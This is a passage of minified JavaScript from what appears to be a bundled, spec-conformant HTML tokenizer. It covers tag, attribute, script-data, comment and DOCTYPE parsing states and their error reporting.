z.EOF:{this._emitEOFToken();break}default:this._emitCodePoint(e)}}_stateTagOpen(e){if(qs(e))this._createStartTagToken(),this.state=H.TAG_NAME,this._stateTagName(e);else switch(e){case z.EXCLAMATION_MARK:{this.state=H.MARKUP_DECLARATION_OPEN;break}case z.SOLIDUS:{this.state=H.END_TAG_OPEN;break}case z.QUESTION_MARK:{this._err(pe.unexpectedQuestionMarkInsteadOfTagName),this._createCommentToken(1),this.state=H.BOGUS_COMMENT,this._stateBogusComment(e);break}case z.EOF:{this._err(pe.eofBeforeTagName),this._emitChars("<"),this._emitEOFToken();break}default:this._err(pe.invalidFirstCharacterOfTagName),this._emitChars("<"),this.state=H.DATA,this._stateData(e)}}_stateEndTagOpen(e){if(qs(e))this._createEndTagToken(),this.state=H.TAG_NAME,this._stateTagName(e);else switch(e){case z.GREATER_THAN_SIGN:{this._err(pe.missingEndTagName),this.state=H.DATA;break}case z.EOF:{this._err(pe.eofBeforeTagName),this._emitChars("</"),this._emitEOFToken();break}default:this._err(pe.invalidFirstCharacterOfTagName),this._createCommentToken(2),this.state=H.BOGUS_COMMENT,this._stateBogusComment(e)}}_stateTagName(e){const t=this.currentToken;switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this.state=H.BEFORE_ATTRIBUTE_NAME;break}case z.SOLIDUS:{this.state=H.SELF_CLOSING_START_TAG;break}case z.GREATER_THAN_SIGN:{this.state=H.DATA,this.emitCurrentTagToken();break}case z.NULL:{this._err(pe.unexpectedNullCharacter),t.tagName+=Ha;break}case z.EOF:{this._err(pe.eofInTag),this._emitEOFToken();break}default:t.tagName+=String.fromCodePoint(Pd(e)?Pf(e):e)}}_stateRcdataLessThanSign(e){e===z.SOLIDUS?this.state=H.RCDATA_END_TAG_OPEN:(this._emitChars("<"),this.state=H.RCDATA,this._stateRcdata(e))}_stateRcdataEndTagOpen(e){qs(e)?(this.state=H.RCDATA_END_TAG_NAME,this._stateRcdataEndTagName(e)):(this._emitChars("</"),this.state=H.RCDATA,this._stateRcdata(e))}handleSpecialEndTag(e){if(!this.preprocessor.startsWith(this.lastStartTagName,!1))return!this._ensureHibernation();this._createEndTagToken();const t=this.currentToken;switch(t.tagName=this.lastStartTagName,this.preprocessor.peek(this.lastStartTagName.length)){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:return this._advanceBy(this.lastStartTagName.length),this.state=H.BEFORE_ATTRIBUTE_NAME,!1;case z.SOLIDUS:return this._advanceBy(this.lastStartTagName.length),this.state=H.SELF_CLOSING_START_TAG,!1;case z.GREATER_THAN_SIGN:return this._advanceBy(this.lastStartTagName.length),this.emitCurrentTagToken(),this.state=H.DATA,!1;default:return!this._ensureHibernation()}}_stateRcdataEndTagName(e){this.handleSpecialEndTag(e)&&(this._emitChars("</"),this.state=H.RCDATA,this._stateRcdata(e))}_stateRawtextLessThanSign(e){e===z.SOLIDUS?this.state=H.RAWTEXT_END_TAG_OPEN:(this._emitChars("<"),this.state=H.RAWTEXT,this._stateRawtext(e))}_stateRawtextEndTagOpen(e){qs(e)?(this.state=H.RAWTEXT_END_TAG_NAME,this._stateRawtextEndTagName(e)):(this._emitChars("</"),this.state=H.RAWTEXT,this._stateRawtext(e))}_stateRawtextEndTagName(e){this.handleSpecialEndTag(e)&&(this._emitChars("</"),this.state=H.RAWTEXT,this._stateRawtext(e))}_stateScriptDataLessThanSign(e){switch(e){case z.SOLIDUS:{this.state=H.SCRIPT_DATA_END_TAG_OPEN;break}case z.EXCLAMATION_MARK:{this.state=H.SCRIPT_DATA_ESCAPE_START,this._emitChars("<!");break}default:this._emitChars("<"),this.state=H.SCRIPT_DATA,this._stateScriptData(e)}}_stateScriptDataEndTagOpen(e){qs(e)?(this.state=H.SCRIPT_DATA_END_TAG_NAME,this._stateScriptDataEndTagName(e)):(this._emitChars("</"),this.state=H.SCRIPT_DATA,this._stateScriptData(e))}_stateScriptDataEndTagName(e){this.handleSpecialEndTag(e)&&(this._emitChars("</"),this.state=H.SCRIPT_DATA,this._stateScriptData(e))}_stateScriptDataEscapeStart(e){e===z.HYPHEN_MINUS?(this.state=H.SCRIPT_DATA_ESCAPE_START_DASH,this._emitChars("-")):(this.state=H.SCRIPT_DATA,this._stateScriptData(e))}_stateScriptDataEscapeStartDash(e){e===z.HYPHEN_MINUS?(this.state=H.SCRIPT_DATA_ESCAPED_DASH_DASH,this._emitChars("-")):(this.state=H.SCRIPT_DATA,this._stateScriptData(e))}_stateScriptDataEscaped(e){switch(e){case z.HYPHEN_MINUS:{this.state=H.SCRIPT_DATA_ESCAPED_DASH,this._emitChars("-");break}case z.LESS_THAN_SIGN:{this.state=H.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN;break}case z.NULL:{this._err(pe.unexpectedNullCharacter),this._emitChars(Ha);break}case z.EOF:{this._err(pe.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this._emitCodePoint(e)}}_stateScriptDataEscapedDash(e){switch(e){case z.HYPHEN_MINUS:{this.state=H.SCRIPT_DATA_ESCAPED_DASH_DASH,this._emitChars("-");break}case z.LESS_THAN_SIGN:{this.state=H.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN;break}case z.NULL:{this._err(pe.unexpectedNullCharacter),this.state=H.SCRIPT_DATA_ESCAPED,this._emitChars(Ha);break}case z.EOF:{this._err(pe.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this.state=H.SCRIPT_DATA_ESCAPED,this._emitCodePoint(e)}}_stateScriptDataEscapedDashDash(e){switch(e){case z.HYPHEN_MINUS:{this._emitChars("-");break}case z.LESS_THAN_SIGN:{this.state=H.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN;break}case z.GREATER_THAN_SIGN:{this.state=H.SCRIPT_DATA,this._emitChars(">");break}case z.NULL:{this._err(pe.unexpectedNullCharacter),this.state=H.SCRIPT_DATA_ESCAPED,this._emitChars(Ha);break}case z.EOF:{this._err(pe.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this.state=H.SCRIPT_DATA_ESCAPED,this._emitCodePoint(e)}}_stateScriptDataEscapedLessThanSign(e){e===z.SOLIDUS?this.state=H.SCRIPT_DATA_ESCAPED_END_TAG_OPEN:qs(e)?(this._emitChars("<"),this.state=H.SCRIPT_DATA_DOUBLE_ESCAPE_START,this._stateScriptDataDoubleEscapeStart(e)):(this._emitChars("<"),this.state=H.SCRIPT_DATA_ESCAPED,this._stateScriptDataEscaped(e))}_stateScriptDataEscapedEndTagOpen(e){qs(e)?(this.state=H.SCRIPT_DATA_ESCAPED_END_TAG_NAME,this._stateScriptDataEscapedEndTagName(e)):(this._emitChars("</"),this.state=H.SCRIPT_DATA_ESCAPED,this._stateScriptDataEscaped(e))}_stateScriptDataEscapedEndTagName(e){this.handleSpecialEndTag(e)&&(this._emitChars("</"),this.state=H.SCRIPT_DATA_ESCAPED,this._stateScriptDataEscaped(e))}_stateScriptDataDoubleEscapeStart(e){if(this.preprocessor.startsWith(mn.SCRIPT,!1)&&fL(this.preprocessor.peek(mn.SCRIPT.length))){this._emitCodePoint(e);for(let t=0;t<mn.SCRIPT.length;t++)this._emitCodePoint(this._consume());this.state=H.SCRIPT_DATA_DOUBLE_ESCAPED}else this._ensureHibernation()||(this.state=H.SCRIPT_DATA_ESCAPED,this._stateScriptDataEscaped(e))}_stateScriptDataDoubleEscaped(e){switch(e){case z.HYPHEN_MINUS:{this.state=H.SCRIPT_DATA_DOUBLE_ESCAPED_DASH,this._emitChars("-");break}case z.LESS_THAN_SIGN:{this.state=H.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN,this._emitChars("<");break}case z.NULL:{this._err(pe.unexpectedNullCharacter),this._emitChars(Ha);break}case z.EOF:{this._err(pe.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this._emitCodePoint(e)}}_stateScriptDataDoubleEscapedDash(e){switch(e){case z.HYPHEN_MINUS:{this.state=H.SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH,this._emitChars("-");break}case z.LESS_THAN_SIGN:{this.state=H.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN,this._emitChars("<");break}case z.NULL:{this._err(pe.unexpectedNullCharacter),this.state=H.SCRIPT_DATA_DOUBLE_ESCAPED,this._emitChars(Ha);break}case z.EOF:{this._err(pe.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this.state=H.SCRIPT_DATA_DOUBLE_ESCAPED,this._emitCodePoint(e)}}_stateScriptDataDoubleEscapedDashDash(e){switch(e){case z.HYPHEN_MINUS:{this._emitChars("-");break}case z.LESS_THAN_SIGN:{this.state=H.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN,this._emitChars("<");break}case z.GREATER_THAN_SIGN:{this.state=H.SCRIPT_DATA,this._emitChars(">");break}case z.NULL:{this._err(pe.unexpectedNullCharacter),this.state=H.SCRIPT_DATA_DOUBLE_ESCAPED,this._emitChars(Ha);break}case z.EOF:{this._err(pe.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this.state=H.SCRIPT_DATA_DOUBLE_ESCAPED,this._emitCodePoint(e)}}_stateScriptDataDoubleEscapedLessThanSign(e){e===z.SOLIDUS?(this.state=H.SCRIPT_DATA_DOUBLE_ESCAPE_END,this._emitChars("/")):(this.state=H.SCRIPT_DATA_DOUBLE_ESCAPED,this._stateScriptDataDoubleEscaped(e))}_stateScriptDataDoubleEscapeEnd(e){if(this.preprocessor.startsWith(mn.SCRIPT,!1)&&fL(this.preprocessor.peek(mn.SCRIPT.length))){this._emitCodePoint(e);for(let t=0;t<mn.SCRIPT.length;t++)this._emitCodePoint(this._consume());this.state=H.SCRIPT_DATA_ESCAPED}else this._ensureHibernation()||(this.state=H.SCRIPT_DATA_DOUBLE_ESCAPED,this._stateScriptDataDoubleEscaped(e))}_stateBeforeAttributeName(e){switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.SOLIDUS:case z.GREATER_THAN_SIGN:case z.EOF:{this.state=H.AFTER_ATTRIBUTE_NAME,this._stateAfterAttributeName(e);break}case z.EQUALS_SIGN:{this._err(pe.unexpectedEqualsSignBeforeAttributeName),this._createAttr("="),this.state=H.ATTRIBUTE_NAME;break}default:this._createAttr(""),this.state=H.ATTRIBUTE_NAME,this._stateAttributeName(e)}}_stateAttributeName(e){switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:case z.SOLIDUS:case z.GREATER_THAN_SIGN:case z.EOF:{this._leaveAttrName(),this.state=H.AFTER_ATTRIBUTE_NAME,this._stateAfterAttributeName(e);break}case z.EQUALS_SIGN:{this._leaveAttrName(),this.state=H.BEFORE_ATTRIBUTE_VALUE;break}case z.QUOTATION_MARK:case z.APOSTROPHE:case z.LESS_THAN_SIGN:{this._err(pe.unexpectedCharacterInAttributeName),this.currentAttr.name+=String.fromCodePoint(e);break}case z.NULL:{this._err(pe.unexpectedNullCharacter),this.currentAttr.name+=Ha;break}default:this.currentAttr.name+=String.fromCodePoint(Pd(e)?Pf(e):e)}}_stateAfterAttributeName(e){switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.SOLIDUS:{this.state=H.SELF_CLOSING_START_TAG;break}case z.EQUALS_SIGN:{this.state=H.BEFORE_ATTRIBUTE_VALUE;break}case z.GREATER_THAN_SIGN:{this.state=H.DATA,this.emitCurrentTagToken();break}case z.EOF:{this._err(pe.eofInTag),this._emitEOFToken();break}default:this._createAttr(""),this.state=H.ATTRIBUTE_NAME,this._stateAttributeName(e)}}_stateBeforeAttributeValue(e){switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.QUOTATION_MARK:{this.state=H.ATTRIBUTE_VALUE_DOUBLE_QUOTED;break}case z.APOSTROPHE:{this.state=H.ATTRIBUTE_VALUE_SINGLE_QUOTED;break}case z.GREATER_THAN_SIGN:{this._err(pe.missingAttributeValue),this.state=H.DATA,this.emitCurrentTagToken();break}default:this.state=H.ATTRIBUTE_VALUE_UNQUOTED,this._stateAttributeValueUnquoted(e)}}_stateAttributeValueDoubleQuoted(e){switch(e){case z.QUOTATION_MARK:{this.state=H.AFTER_ATTRIBUTE_VALUE_QUOTED;break}case z.AMPERSAND:{this._startCharacterReference();break}case z.NULL:{this._err(pe.unexpectedNullCharacter),this.currentAttr.value+=Ha;break}case z.EOF:{this._err(pe.eofInTag),this._emitEOFToken();break}default:this.currentAttr.value+=String.fromCodePoint(e)}}_stateAttributeValueSingleQuoted(e){switch(e){case z.APOSTROPHE:{this.state=H.AFTER_ATTRIBUTE_VALUE_QUOTED;break}case z.AMPERSAND:{this._startCharacterReference();break}case z.NULL:{this._err(pe.unexpectedNullCharacter),this.currentAttr.value+=Ha;break}case z.EOF:{this._err(pe.eofInTag),this._emitEOFToken();break}default:this.currentAttr.value+=String.fromCodePoint(e)}}_stateAttributeValueUnquoted(e){switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this._leaveAttrValue(),this.state=H.BEFORE_ATTRIBUTE_NAME;break}case z.AMPERSAND:{this._startCharacterReference();break}case z.GREATER_THAN_SIGN:{this._leaveAttrValue(),this.state=H.DATA,this.emitCurrentTagToken();break}case z.NULL:{this._err(pe.unexpectedNullCharacter),this.currentAttr.value+=Ha;break}case z.QUOTATION_MARK:case z.APOSTROPHE:case z.LESS_THAN_SIGN:case z.EQUALS_SIGN:case z.GRAVE_ACCENT:{this._err(pe.unexpectedCharacterInUnquotedAttributeValue),this.currentAttr.value+=String.fromCodePoint(e);break}case z.EOF:{this._err(pe.eofInTag),this._emitEOFToken();break}default:this.currentAttr.value+=String.fromCodePoint(e)}}_stateAfterAttributeValueQuoted(e){switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this._leaveAttrValue(),this.state=H.BEFORE_ATTRIBUTE_NAME;break}case z.SOLIDUS:{this._leaveAttrValue(),this.state=H.SELF_CLOSING_START_TAG;break}case z.GREATER_THAN_SIGN:{this._leaveAttrValue(),this.state=H.DATA,this.emitCurrentTagToken();break}case z.EOF:{this._err(pe.eofInTag),this._emitEOFToken();break}default:this._err(pe.missingWhitespaceBetweenAttributes),this.state=H.BEFORE_ATTRIBUTE_NAME,this._stateBeforeAttributeName(e)}}_stateSelfClosingStartTag(e){switch(e){case z.GREATER_THAN_SIGN:{const t=this.currentToken;t.selfClosing=!0,this.state=H.DATA,this.emitCurrentTagToken();break}case z.EOF:{this._err(pe.eofInTag),this._emitEOFToken();break}default:this._err(pe.unexpectedSolidusInTag),this.state=H.BEFORE_ATTRIBUTE_NAME,this._stateBeforeAttributeName(e)}}_stateBogusComment(e){const t=this.currentToken;switch(e){case z.GREATER_THAN_SIGN:{this.state=H.DATA,this.emitCurrentComment(t);break}case z.EOF:{this.emitCurrentComment(t),this._emitEOFToken();break}case z.NULL:{this._err(pe.unexpectedNullCharacter),t.data+=Ha;break}default:t.data+=String.fromCodePoint(e)}}_stateMarkupDeclarationOpen(e){this._consumeSequenceIfMatch(mn.DASH_DASH,!0)?(this._createCommentToken(mn.DASH_DASH.length+1),this.state=H.COMMENT_START):this._consumeSequenceIfMatch(mn.DOCTYPE,!1)?(this.currentLocation=this.getCurrentLocation(mn.DOCTYPE.length+1),this.state=H.DOCTYPE):this._consumeSequenceIfMatch(mn.CDATA_START,!0)?this.inForeignNode?this.state=H.CDATA_SECTION:(this._err(pe.cdataInHtmlContent),this._createCommentToken(mn.CDATA_START.length+1),this.currentToken.data="[CDATA[",this.state=H.BOGUS_COMMENT):this._ensureHibernation()||(this._err(pe.incorrectlyOpenedComment),this._createCommentToken(2),this.state=H.BOGUS_COMMENT,this._stateBogusComment(e))}_stateCommentStart(e){switch(e){case z.HYPHEN_MINUS:{this.state=H.COMMENT_START_DASH;break}case z.GREATER_THAN_SIGN:{this._err(pe.abruptClosingOfEmptyComment),this.state=H.DATA;const t=this.currentToken;this.emitCurrentComment(t);break}default:this.state=H.COMMENT,this._stateComment(e)}}_stateCommentStartDash(e){const t=this.currentToken;switch(e){case z.HYPHEN_MINUS:{this.state=H.COMMENT_END;break}case z.GREATER_THAN_SIGN:{this._err(pe.abruptClosingOfEmptyComment),this.state=H.DATA,this.emitCurrentComment(t);break}case z.EOF:{this._err(pe.eofInComment),this.emitCurrentComment(t),this._emitEOFToken();break}default:t.data+="-",this.state=H.COMMENT,this._stateComment(e)}}_stateComment(e){const t=this.currentToken;switch(e){case z.HYPHEN_MINUS:{this.state=H.COMMENT_END_DASH;break}case z.LESS_THAN_SIGN:{t.data+="<",this.state=H.COMMENT_LESS_THAN_SIGN;break}case z.NULL:{this._err(pe.unexpectedNullCharacter),t.data+=Ha;break}case z.EOF:{this._err(pe.eofInComment),this.emitCurrentComment(t),this._emitEOFToken();break}default:t.data+=String.fromCodePoint(e)}}_stateCommentLessThanSign(e){const t=this.currentToken;switch(e){case z.EXCLAMATION_MARK:{t.data+="!",this.state=H.COMMENT_LESS_THAN_SIGN_BANG;break}case z.LESS_THAN_SIGN:{t.data+="<";break}default:this.state=H.COMMENT,this._stateComment(e)}}_stateCommentLessThanSignBang(e){e===z.HYPHEN_MINUS?this.state=H.COMMENT_LESS_THAN_SIGN_BANG_DASH:(this.state=H.COMMENT,this._stateComment(e))}_stateCommentLessThanSignBangDash(e){e===z.HYPHEN_MINUS?this.state=H.COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH:(this.state=H.COMMENT_END_DASH,this._stateCommentEndDash(e))}_stateCommentLessThanSignBangDashDash(e){e!==z.GREATER_THAN_SIGN&&e!==z.EOF&&this._err(pe.nestedComment),this.state=H.COMMENT_END,this._stateCommentEnd(e)}_stateCommentEndDash(e){const t=this.currentToken;switch(e){case z.HYPHEN_MINUS:{this.state=H.COMMENT_END;break}case z.EOF:{this._err(pe.eofInComment),this.emitCurrentComment(t),this._emitEOFToken();break}default:t.data+="-",this.state=H.COMMENT,this._stateComment(e)}}_stateCommentEnd(e){const t=this.currentToken;switch(e){case z.GREATER_THAN_SIGN:{this.state=H.DATA,this.emitCurrentComment(t);break}case z.EXCLAMATION_MARK:{this.state=H.COMMENT_END_BANG;break}case z.HYPHEN_MINUS:{t.data+="-";break}case z.EOF:{this._err(pe.eofInComment),this.emitCurrentComment(t),this._emitEOFToken();break}default:t.data+="--",this.state=H.COMMENT,this._stateComment(e)}}_stateCommentEndBang(e){const t=this.currentToken;switch(e){case z.HYPHEN_MINUS:{t.data+="--!",this.state=H.COMMENT_END_DASH;break}case z.GREATER_THAN_SIGN:{this._err(pe.incorrectlyClosedComment),this.state=H.DATA,this.emitCurrentComment(t);break}case z.EOF:{this._err(pe.eofInComment),this.emitCurrentComment(t),this._emitEOFToken();break}default:t.data+="--!",this.state=H.COMMENT,this._stateComment(e)}}_stateDoctype(e){switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this.state=H.BEFORE_DOCTYPE_NAME;break}case z.GREATER_THAN_SIGN:{this.state=H.BEFORE_DOCTYPE_NAME,this._stateBeforeDoctypeName(e);break}case z.EOF:{this._err(pe.eofInDoctype),this._createDoctypeToken(null);const t=this.currentToken;t.forceQuirks=!0,this.emitCurrentDoctype(t),this._emitEOFToken();break}default:this._err(pe.missingWhitespaceBeforeDoctypeName),this.state=H.BEFORE_DOCTYPE_NAME,this._stateBeforeDoctypeName(e)}}_stateBeforeDoctypeName(e){if(Pd(e))this._createDoctypeToken(String.fromCharCode(Pf(e))),this.state=H.DOCTYPE_NAME;else switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.NULL:{this._err(pe.unexpectedNullCharacter),this._createDoctypeToken(Ha),this.state=H.DOCTYPE_NAME;break}case z.GREATER_THAN_SIGN:{this._err(pe.missingDoctypeName),this._createDoctypeToken(null);const t=this.currentToken;t.forceQuirks=!0,this.emitCurrentDoctype(t),this.state=H.DATA;break}case z.EOF:{this._err(pe.eofInDoctype),this._createDoctypeToken(null);const t=this.currentToken;t.forceQuirks=!0,this.emitCurrentDoctype(t),this._emitEOFToken();break}default:this._createDoctypeToken(String.fromCodePoint(e)),this.state=H.DOCTYPE_NAME}}_stateDoctypeName(e){const t=this.currentToken;switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this.state=H.AFTER_DOCTYPE_NAME;break}case z.GREATER_THAN_SIGN:{this.state=H.DATA,this.emitCurrentDoctype(t);break}case z.NULL:{this._err(pe.unexpectedNullCharacter),t.name+=Ha;break}case z.EOF:{this._err(pe.eofInDoctype),t.forceQuirks=!0,this.emitCurrentDoctype(t),this._emitEOFToken();break}default:t.name+=String.fromCodePoint(Pd(e)?Pf(e):e)}}_stateAfterDoctypeName(e){const t=this.currentToken;switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.GREATER_THAN_SIGN:{this.state=H.DATA,this.emitCurrentDoctype(t);break}case z.EOF:{this._err(pe.eofInDoctype),t.forceQuirks=!0,this.emitCurrentDoctype(t),this._emitEOFToken();break}default:this._consumeSequenceIfMatch(mn.PUBLIC,!1)?this.state=H.AFTER_DOCTYPE_PUBLIC_KEYWORD:this._consumeSequenceIfMatch(mn.SYSTEM,!1)?this.state=H.AFTER_DOCTYPE_SYSTEM_KEYWORD:this._ensureHibernation()||(this._err(pe.invalidCharacterSequenceAfterDoctypeName),t.forceQuirks=!0,this.state=H.BOGUS_DOCTYPE,this._stateBogusDoctype(e))}}_stateAfterDoctypePublicKeyword(e){const t=this.currentToken;switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this.state=H.BEFORE_DOCTYPE_PUBLIC_IDENTIFIER;break}case z.QUOTATION_MARK:{this._err(pe.missingWhitespaceAfterDoctypePublicKeyword),t.publicId="",this.state=H.DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED;break}case z.APOSTROPHE:{this._err(pe.missingWhitespaceAfterDoctypePublicKeyword),t.publicId="",this.state=H.DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED;break}case z.GREATER_THAN_SIGN:{this._err(pe.missingDoctypePublicIdentifier),t.forceQuirks=!0,this.state=H.DATA,this.emitCurrentDoctype(t);break}case z.EOF:{this._err(pe.eofInDoctype),t.forceQuirks=!0,this.emitCurrentDoctype(t),this._emitEOFToken();break}default:this._err(pe.missingQuoteBeforeDoctypePublicIdentifier),t.forceQuirks=!0,this.state=H.BOGUS_DOCTYPE,this._stateBogusDoctype(e)}}_stateBeforeDoctypePublicIdentifier(e){const t=this.currentToken;switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.QUOTATION_MARK:{t.publicId="",this.state=H.DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED;break}case z.APOSTROPHE:{t.publicId="",this.state=H.DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED;break}case z.GREATER_THAN_SIGN:{this._err(pe.missingDoctypePublicIdentifier),t.forceQuirks=!0,this.state=H.DATA,this.emitCurrentDoctype(t);break}case z.EOF:{this._err(pe.eofInDoctype),t.forceQuirks=!0,this.emitCurrentDoctype(t),this._emitEOFToken();break}default:this._err(pe.missingQuoteBeforeDoctypePublicIdentifier),t.forceQuirks=!0,this.state=H.BOGUS_DOCTYPE,this._stateBogusDoctype(e)}}_stateDoctypePublicIdentifierDoubleQuoted(e){const t=this.currentToken;switch(e){case z.QUOTATION_MARK:{this.state=H.AFTER_DOCTYPE_PUBLIC_IDENTIFIER;break}case z.NULL:{this._err(pe.unexpectedNullCharacter),t.publicId+=Ha;break}case z.GREATER_THAN_SIGN:{this._err(pe.abruptDoctypePublicIdentifier),t.forceQuirks=!0,this.emitCurrentDoctype(t),this.state=H.DATA;break}case z.EOF:{this._err(pe.eofInDoctype),t.forceQuirks=!0,this.emitCurrentDoctype(t),this._emitEOFToken();break}default:t.publicId+=String.fromCodePoint(e)}}_stateDoctypePublicIdentifierSingleQuoted(e){const t=this.currentToken;switch(e){case z.APOSTROPHE:{this.state=H.AFTER_DOCTYPE_PUBLIC_IDENTIFIER;break}case z.NULL:{this._err(pe.unexpectedNullCharacter),t.publicId+=Ha;break}case z.GREATER_THAN_SIGN:{this._err(pe.abruptDoctypePublicIdentifier),t.forceQuirks=!0,this.emitCurrentDoctype(t),this.state=H.DATA;break}case z.EOF:{this._err(pe.eofInDoctype),t.forceQuirks=!0,this.emitCurrentDoctype(t),this._emitEOFToken();break}default:t.publicId+=String.fromCodePoint(e)}}_stateAfterDoctypePublicIdentifier(e){const t=this.currentToken;switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this.state=H.BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS;break}case z.GREATER_THAN_SIGN:{this.state=H.DATA,this.emitCurrentDoctype(t);break}case z.QUOTATION_MARK:{this._err(pe.missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers),t.systemId="",this.state=H.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED;break}case z.APOSTROPHE:{this._err(pe.missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers),t.systemId="",this.state=H.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED;break}case z.EOF:{this._err(pe.eofInDoctype),t.forceQuirks=!0,this.emitCurrentDoctype(t),this._emitEOFToken();break}default:this._err(pe.missingQuoteBeforeDoctypeSystemIdentifier),t.forceQuirks=!0,this.state=H.BOGUS_DOCTYPE,this._stateBogusDoctype(e)}}_stateBetweenDoctypePublicAndSystemIdentifiers(e){const t=this.currentToken;switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.GREATER_THAN_SIGN:{this.emitCurrentDoctype(t),this.state=H.DATA;break}case z.QUOTATION_MARK:{t.systemId="",this.state=H.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED;break}case z.APOSTROPHE:{t.systemId="",this.state=H.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED;break}case z.EOF:{this._err(pe.eofInDoctype),t.forceQuirks=!0,this.emitCurrentDoctype(t),this._emitEOFToken();break}default:this._err(pe.missingQuoteBeforeDoctypeSystemIdentifier),t.forceQuirks=!0,this.state=H.BOGUS_DOCTYPE,this._stateBogusDoctype(e)}}_stateAfterDoctypeSystemKeyword(e){const t=this.currentToken;switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this.state=H.BEFORE_DOCTYPE_SYSTEM_IDENTIFIER;break}case z.QUOTATION_MARK:{this._err(pe.missingWhitespaceAfterDoctypeSystemKeyword),t.systemId="",this.state=H.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED;break}case z.APOSTROPHE:{this._err(pe.missingWhitespaceAfterDoctypeSystemKeyword),t.systemId="",this.state=H.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED;break}case z.GREATER_THAN_SIGN:{this._err(pe.missingDoctypeSystemIdentifier),t.forceQuirks=!0,this.state=H.DATA,this.emitCurrentDoctype(t);break}case z.EOF:{this._err(pe.eofInDoctype),t.forceQuirks=!0,this.emitCurrentDoctype(t),this._emitEOFToken();break}default:this._err(pe.missingQuoteBeforeDoctypeSystemIdentifier),t.forceQuirks=!0,this.state=H.BOGUS_DOCTYPE,this._stateBogusDoctype(e)}}_stateBeforeDoctypeSystemIdentifier(e){const t=this.currentToken;switch(e){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.QUOTATION_MARK:{t.systemId="",this.state=H.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED;break}case z.APOSTROPHE:{t.systemId="",this.state=H.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED;break}case z.GREATER_THAN_SIGN:{this._err(pe.missingDoctypeSystemIdentifier),t.forceQuirks=!0,this.state=H.DATA,this.emitCurrentDoctype(t);break}case z.EOF:{this._err(pe.eofInDoctype),t.forceQuirks=!0,this.emitCurrentDoctype(t),this._emitEOFToken();break}default:this._err(pe.missingQuoteBeforeDoctypeSystemIdentifier),t.forceQuirks=!0,this.state=H.BOGUS_DOCTYPE,this._stateBogusDoctype(e)}}_stateDoctypeSystemIdentifierDoubleQuoted(e){const t=this.currentToken;switch(e){case z.QUOTATION_MARK:{this.state=H.AFTER_DOCTYPE_SYSTEM_IDENTIFIER;break}case z.NULL:{this._err(pe.unexpectedNullCharacter),t.systemId+=Ha;break}case z.GREATER_THAN_SIGN:{this._err(pe.abruptDoctypeSystemIdentifier),t.forceQuirks=!0,this.emitCurrentDoctype(t),this.state=H.DATA;break}case z.EOF:{this._err(pe.eofInDoctype),t.forceQuirks=!0,this.emitCurrentDoctype(t),this._emitEOFToken();break}default:t.systemId+=String.fromCodePoint(e)}}_stateDoctypeSystemIdentifierSingleQuoted(e){const t=this.currentToken;switch(e){case z.APOSTROPHE:{this.state=H.AFTER_DOCTYPE_SYSTEM_IDENTIFIER;break}case z.NULL:{this._err(pe.unexpectedNullCharacter),t.systemId+=Ha;break}case z.GREATER_THAN_SIGN:{this._err(pe.abruptDoctypeSystemIdentifier),t.forceQuirks=!0,this.emitCurrentDoctype(t),this.state=H.DATA;break}case z.EOF:{this._err(pe.eofInDoctype),t.forceQuirks=!0,this.emitCurrentDoctype(t),this._emitEOFToken();break}default:t.systemId+=String.fromCodePoint(e)}}_stateAfterDoctypeSystemIdentifier(e){const t=this.currentToken;switch(e){case z.SPACE:case 